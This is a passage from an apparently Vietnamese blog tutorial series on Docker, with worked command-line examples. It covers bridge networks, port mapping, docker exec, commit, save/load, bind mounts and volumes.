\u0026#34;sh\u0026#34; 8 minutes ago Up 8 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 Chúng ta sẽ thao tác lại một lần ở docker B2 để chạy httpd và tạo file index.html với nội dung web server is running... trong thư mục /var/www. Sau đó, chúng ta truy cập ở trình duyện chrome từ máy host đến địa chỉ 127.0.0.1:8888\nNhư vậy, ta đã có thể truy cập đến file index.html trong container B2 từ mạng bên ngoài host.\nTạo thêm mạng Trường hợp chúng ta không muốn tất cả các container cùng kết nối vào một mạng bridge, ta có thể tạo thêm nhiều bridge riêng để có thể tách các riêng các container thành các cụm riêng. Để tạo ra một mạng bridge, ta dùng lệnh:\ndocker network create --driver \u0026lt;loai_mang\u0026gt; \u0026lt;ten_mang\u0026gt;\nỞ đây chúng ta muốn tạo thêm mạng bridge nên sau --driver sẽ là bridge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local ❯ docker network create --driver bridge mynetwork 6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0 ❯ docker network create --driver bridge network1 8f94d7a2e8ff372c3072294dd5260bbea0d0fb2692c2bedc3acad080b07b229c ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 6c224f5d1a98 mynetwork bridge local 8f94d7a2e8ff network1 bridge local 271997adaaa9 none null local Chúng ta tiến hành tạo một số container không kết nối mặc định vào network bridge mà sẽ kết nối vào mynetwork của chúng ta.\n1 2 ❯ docker run -it --name B3 --network mynetwork busybox / # Để chỉ định network khi tạo, ta thêm tùy chọn --network và theo sau là tên của network mình muốn kết nối tới. Chúng ta kiểm tra xem B3 có thật sự đã kết nối tới mynetwork chưa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ❯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] Rõ ràng ở trường container đã thêm một container là B3 với địa chỉ là 172.20.0.2. Chúng ta tiếp tục tạo thêm một container B4 kết nối với mynetwork và chỉ định cổng 80 của nó ánh xạ tới cổng 9999 trên máy host.\n1 2 3 4 5 6 7 8 ❯ docker run -it --name B4 --network mynetwork -p 9999:80 busybox / # % ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 1b39318c8d5b busybox \u0026#34;sh\u0026#34; About a minute ago Up About a minute 0.0.0.0:9999-\u0026gt;80/tcp B4 a7231f2ebe67 busybox \u0026#34;sh\u0026#34; 5 minutes ago Up 5 minutes B3 bdd19faad9cf busybox \u0026#34;sh\u0026#34; 37 minutes ago Up 37 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 hours ago Up 3 seconds B1 Như vậy, trên máy của chúng ta đang 2 mạng là bridge và mynetwork:\nMạng bridge có 2 container đang kết nối tới là B1 và B2, trong đó B2 đang ánh xạ cổng 80 đến cổng 8888 trên máy host. Mạng mynetwork có 2 container đang kết nối tới là B3 và B4, trong đó B4 đang ánh xạ cổng 80 đến cổng 9999 trên host.\nTa tiến hành chạy web server http trên container B4 và kết nối từ mạng bên ngoài host.\nKhi tạo ra 2 network thì những máy cùng 1 network (B1 với B2 hoặc B3 với B4) có thể thấy được nhau, tuy nhiên ở khác network (B1 với B3,B4 hoặc B2 với B3,B4) thì không thể thấy nhau. Chúng ta có thể kiểm tra điều này thông qua lênh ping, từ B1 đến B2 và B1 đến B3. Dùng lệnh docker network inspect \u0026lt;ten_network\u0026gt; ta biết được ip của B1, B2, B3 lần lượt là 172.17.0.3, 172.17.0.2, 172.20.0.2. Vào B1 và tiến hành ping qua B2, B3: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker attach B1 / # ping 172.17.0.2 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.268 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.101 ms 64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.198 ms 64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.162 ms 64 bytes from 172.17.0.2: seq=4 ttl=64 time=0.165 ms 64 bytes from 172.17.0.2: seq=5 ttl=64 time=0.164 ms 64 bytes from 172.17.0.2: seq=6 ttl=64 time=0.139 ms 64 bytes from 172.17.0.2: seq=7 ttl=64 time=0.160 ms 64 bytes from 172.17.0.2: seq=8 ttl=64 time=0.181 ms ^C --- 172.17.0.2 ping statistics --- 9 packets transmitted, 9 packets received, 0% packet loss round-trip min/avg/max = 0.101/0.170/0.268 ms / # ping 172.20.0.2 PING 172.20.0.2 (172.20.0.2): 56 data bytes ^C --- 172.20.0.2 ping statistics --- 25 packets transmitted, 0 packets received, 100% packet loss / # Ánh xạ cổng cho một container đang chạy. Trong ví dụ trên, B3 đang kết nối tới mynetwork, ta muốn cho B3 kết nối thẳng tới network bridge, ta làm như sau:\ndocker network connect \u0026lt;ten_mang_muon_ket_noi\u0026gt; \u0026lt;ten_container\u0026gt;\n1 ❯ docker network connect bridge B3 Kiểm tra mạng bridge để xem B3 đã thực sự kết nối chưa:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;286d5161c9f65235af68d99040f31b167b4bf23f9803fa3a2b3bd7de61b7c81c\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T06:58:33.069522692+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5ddc6f87b486401bd0e2cfea3e1c8324300f9045712778f1c321e35349c56cff\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;f1c96c1089fbe206c52832089be7b18321aeea7abff840f5169d3d171fa5ca1d\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:04\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.4/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;bdd19faad9cfe6ba9f49a532cf245b3a1bec95d8d20688f4c6b52018d45538b2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B2\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;32f69c565c649791c9f70db3a7a224e6a8d882b41fb9dc7c6477d4f33b9ec32b\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Trong trường container đã có thêm container B3, và kiểm tra network mynetwork thì thấy B3 vẫn đang kết nối tới mynetwork.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ❯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;1b39318c8d5b92261c22321f765945b85231160b53a9a3933b5fe120db80e7c2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B4\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5f26179cc819ffe9f6089c8de41cc236a36ce90c5ac646041d99de7d4a54d3e5\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] Lúc này, B3 có thể kết nối tới B2 và B1 và ngược lại.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ docker attach B1 / # ping 173.20.0.2 PING 173.20.0.2 (173.20.0.2): 56 data bytes 64 bytes from 173.20.0.2: seq=0 ttl=49 time=325.730 ms 64 bytes from 173.20.0.2: seq=1 ttl=49 time=297.840 ms 64 bytes from 173.20.0.2: seq=2 ttl=49 time=280.704 ms 64 bytes from 173.20.0.2: seq=3 ttl=49 time=328.708 ms 64 bytes from 173.20.0.2: seq=4 ttl=49 time=274.586 ms 64 bytes from 173.20.0.2: seq=5 ttl=49 time=295.232 ms 64 bytes from 173.20.0.2: seq=6 ttl=49 time=274.058 ms ^C --- 173.20.0.2 ping statistics --- 8 packets transmitted, 7 packets received, 12% packet loss round-trip min/avg/max = 274.058/296.694/328.708 ms Một lưu ý là khi B3 và B4 cùng kết nối với nhau qua một mạng, bên cạnh kết nối với nhau qua địa chỉ thì chúng có thể kết nối với nhau qua tên.\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker attach B3 / # ping B4 PING B4 (172.20.0.3): 56 data bytes 64 bytes from 172.20.0.3: seq=0 ttl=64 time=0.283 ms 64 bytes from 172.20.0.3: seq=1 ttl=64 time=0.194 ms 64 bytes from 172.20.0.3: seq=2 ttl=64 time=0.164 ms 64 bytes from 172.20.0.3: seq=3 ttl=64 time=0.191 ms ^C --- B4 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.164/0.208/0.283 ms Tuy nhiên B1, B2 cũng kết nối với nhau chung 1 mạng mà chúng không thể giao tiếp với nhau qua tên. Có thể do mạng của chúng cùng kết nối là mạng mặc định (bridge).\n1 2 3 ❯ docker attach B1 / # ping B2 ping: bad address \u0026#39;B2\u0026#39; Xóa mạng Khi không có nhu cầu sử dụng network nữa, chúng ta có thể xóa chúng đi với cú pháp:\ndocker network rm \u0026lt;ten_network\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 258acbefb858 network1 bridge local 271997adaaa9 none null local ❯ docker network rm network1 network1 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 271997adaaa9 none null local Kết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau:\nBiết về busybox Các lệnh thao tác với docker network: liệt kê, kiểm tra thông tin mạng Mạng bridge, tạo thêm, xóa mạng, ánh xạ cổng mạng trong docker. Kết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này.\n","description":"Phần này chúng ta sẽ học về : Mạng | Networking trong Docker, tạo và quản lý network trong container Docker ","id":21,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P3)","uri":"https://minhlongmt183.github.io/posts/docker_p3/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rLệnh Docker exec, lưu container thành image với commit, xuất image ra file Docker exec Thông thường, để thực thi một lệnh trong container, ta sẽ vào container bằng lệnh docker attach \u0026lt;container name or id\u0026gt;. Tuy nhiên, nếu ta đang ở host và vẫn muốn thực thi một lệnh bên trong container đang chạy, ta sẽ dùng lệnh docker exec \u0026lt;container id / name\u0026gt; [COMMAND].\nVí dụ, từ host, ta chạy lệnh ls để liệt kê tất cả các file trong container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 3 minutes ago Up 3 minutes test ❯ docker exec test ls bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var Ngoài ra cũng vẫn có thể thêm các option, ví dụ:\n1 2 ❯ docker exec -it test bash root@ubuntu1:/# Lệnh trên yêu cầu thực thi lệnh bash và thêm option -it để có thể tương tác trực tiếp với terminal, dễ dàng thấy, nó khá giống với lệnh docker attach, tuy nhiên, khi mở các process trong container bằng htop, chúng ta sẽ thấy như sau:\nRõ ràng, ở đây có ngoài process /bin/bash có khi tạo, container còn chạy thêm một process bash, process này chính là lệnh mà chúng ta yêu cầu thực thi từ máy host. Sau khi thực hiện lệnh docker exec -it test bash, ta gõ lệnh exit để thoát khỏi container, tuy nhiên, vì container vẫn còn process /bin/bash nên nó vẫn còn hoạt động chứ không bị tắt đi.\nDocker commit Sau khi cài docker và sử dụng, chúng ta có thể phải cài thêm nhiều phần mềm, môi trường khác nhau. Khi đó, để chia sẻ container này đi, ta cần lưu container này thành image. Để làm việc đó, ta sử dụng lệnh container commit.\nTrước khi lưu container trở thành image, ta kiểm tra xem trong hệ thống có những image nào:\n1 2 3 4 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Một điều lưu ý, muốn lưu container thành image, thì container đó phải ở trạng thái dừng (Exited).\n1 2 3 4 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 23 minutes ago Exited (0) 4 minutes ago test ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 16 hours ago Exited (0) 16 hours ago centos_docker Tiến hành lưu container thành images, ta dùng cú pháp: docker commit CONTAINER image:tag. CONTAINER ở đây là tên hoặc id của container.\nVí dụ, container ubuntu vừa rồi tôi đã cài thêm ping với vim, bây giờ lưu lại thành image, ta thực hiện:\n1 2 3 4 5 6 7 ❯ docker commit test ubuntu-pv:version1 sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 5 seconds ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Rõ ràng, sau khi thực hiện lệnh trên, chúng ta sẽ thấy trong danh sách các images có thểm một image có thên là ubuntu-py với TAG là version1 cùng ID và các thông tin khác.\nDocker save Sau khi ta lưu container thành một image, để có thể chia sẻ image này với người khác, ta lưu image thành một file trên máy host. Việc này sẽ được thực hiện thông qua lệnh docker save --output filename.tar \u0026lt;image_id/name\u0026gt;.\n1 2 3 4 5 6 7 8 9 10 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 6 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker save --output ubuntu-pv.tar a8 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar Ví dụ trên tôi đã lưu ubuntu-pv image thành ra file ubuntu-pv.tar.\nDocker load Sau khi nhận được file image.tar, để phục hồi hoặc sử dụng lại, ta sử dụng lệnh docker load -i image.tar\nVí dụ, tôi tiến hành xóa đi ubuntu-pv image hiện có trên hệ thống. Lệnh thao tác với image bạn có thể xem ở P1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 11 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker image rm -f ubuntu-pv:version1 Untagged: ubuntu-pv:version1 Deleted: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker image rm ubuntu:latest Untagged: ubuntu:latest Untagged: ubuntu@sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Deleted: sha256:7e0aa2d69a153215c790488ed1fcec162015e973e49962d438e18249d16fa9bd ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos latest 300e315adb2f 6 months ago 209MB Bây giờ, ta tiến hành phục hồi ubuntu-pv image từ file ubuntu-pv.tar đã có ở trước đó.\n1 2 3 4 5 6 7 8 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar ❯ docker load -i ubuntu-pv.tar Loaded image ID: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; a8e04dcf8737 14 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB Khi phục hồi, tên của image và tag của nó sẽ là \u0026lt;none\u0026gt;. Để đặt tên và tag, ta dùng lệnh:\ndocker tag image_id name:tag.\n❯ docker tag a8 newimage:version2\r❯ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 16 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB Chia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume Chia sẻ dữ liệu giữa máy host và container Trên máy host, tôi tổ chức cây thực mục như sau:\n1 2 3 4 . ├── docker │ └── data │ └── d.txt Mục tiêu của chúng ta là để container có thể truy cập và thao tác với dữ liệu ở trong data, và khi container bị xóa đi, dữ liệu không bị mất.\nChúng ta tạo mới một container và trong lúc tạo sẽ chỉ rõ thực mục ánh xạ trên host và thực mục được ánh xạ ở đâu trên container.\ndocker run -it -v \u0026lt;thu/muc/tren/host\u0026gt;:\u0026lt;thu/muc/anh/xa/tren/container\u0026gt; \u0026lt;image id\u0026gt;\n1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 28 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data a8 root@d4d24f24bbe6:/# Chúng ta tiến hành kiểm tra:\n1 2 3 4 root@d4d24f24bbe6:/# cd /home/shared_data/ root@d4d24f24bbe6:/home/shared_data# ls d.txt root@d4d24f24bbe6:/home/shared_data# Như vậy, dữ liệu đã được ánh xạ và mọi thao tác trên dữ liệu ở thư mục này sẽ được lưu vào host.\nChia sẻ dữ liệu giữa các container với nhau Chúng ta tạo lại một container có tên là container1 ánh xạ tới dữ liệu Desktop/docker/data, và tạo một container2 muốn ánh xạ tới dự liệu này, thay vì dùng lệnh tạo như container1, ta có thể dùng --volumes-from \u0026lt;container_name/id\u0026gt;\n1 2 3 4 5 6 7 8 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 36 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data --name \u0026#34;container1\u0026#34; a8 root@b62e5d395369:/# % ❯ docker run -it --name container2 --volumes-from container1 centos [root@e1103acb0525 /]# Chia sẻ qua volume Bên cạnh việc chia sẻ dữ liệu bằng cách tạo các file dữ liệu, docker còn cho phép chúng ta tạo ra những ổ đĩa, gán vào container và để chia sẻ dữ liệu giữa chúng. Cũng như file, khi container xóa thì những ổ đĩa này vẫn còn tồn tại cho đến khi chúng ta cố tình xóa nó.\nKiểm tra các ổ đĩa hiện có Để kiểm tra các ổ đĩa hiện có, ta dùng lệnh:\n1 2 ❯ docker volume ls DRIVER VOLUME NAME Hiện tại trên hệ thống không có ổ đĩa nào.\nTạo ổ đĩa Để tạo một ổ đĩa mới, ta dùng lệnh: docker volume create NAMEDISK.\n1 2 3 4 5 ❯ docker volume create D1 D1 ❯ docker volume ls DRIVER VOLUME NAME local D1 Kiểm tra thông tin ổ đĩa Để kiểm tra thông tin ổ đĩa ta dùng lệnh docker volume inspect NAMEDISK.\n1 2 3 4 5 6 7 8 9 10 11 12 ❯ docker volume inspect D1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:06:13+07:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/D1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;D1\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] Xóa ổ đĩa Khi không có nhu cầu sử dụng, ta sử dụng lệnh docker volume rm NAMEDISK.\n1 2 3 4 5 6 7 8 9 ❯ docker volume ls DRIVER VOLUME NAME local D1 local D2 ❯ docker volume rm D1 D1 ❯ docker volume ls DRIVER VOLUME NAME local D2 Gán ổ đĩa volume vào container Ta sử dụng cú pháp:\ndocker run -it --mount source=DISK,target=pathContainer imageID\n1 2 3 4 5 6 7 8 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# Ta tiến hành thêm dữ liệu trong thư mục trên, sau đó xóa container đi, và thấy, ổ đĩa vẫn còn.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 524a1182f690 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About a minute ago Exited (0) 23 seconds ago cocky_mclaren e1103acb0525 centos \u0026#34;/bin/bash\u0026#34; 19 minutes ago Exited (127) 11 minutes ago container2 b62e5d395369 a8 \u0026#34;/bin/bash\u0026#34; 21 minutes ago Exited (0) 11 minutes ago container1 ❯ docker rm 52 52 ❯ docker volume ls DRIVER VOLUME NAME local D2 Vậy làm sao để truy xuất dữ liệu hiện có trên D2 hoặc kiểm tra xem có dữ liệu trên đó hay không? Để làm được điều đó, chúng ta tạo một container khác, mount tới D2 và kiểm tra.\n1 2 3 4 5 ❯ docker run -it --mount source=D2,target=/home/disk3 ubuntu:latest root@ca47e1855144:/# cd /home/disk3/ root@ca47e1855144:/home/disk3# ls data.txt root@ca47e1855144:/home/disk3# Dữ liệu do container trước đã tạo và lưu vào, dữ liệu này vẫn còn mặc dù container đã xóa đi.\nTạo ổ đĩa ánh xạ tới thư mục trên máy host. Cú pháp:\ndocker create --opt device =pathHOST --opt type=noe --opt o=bind DISKNAME\n1 2 3 4 5 6 ❯ docker volume create --opt device=/home/edisc/Desktop/docker/data --opt type=none --opt o=bind DISK1 DISK1 ❯ docker volume ls DRIVER VOLUME NAME local D2 local DISK1 Thông tin ổ đĩa có được như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ docker volume inspect DISK1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:27:56+07:00\u0026#34;, 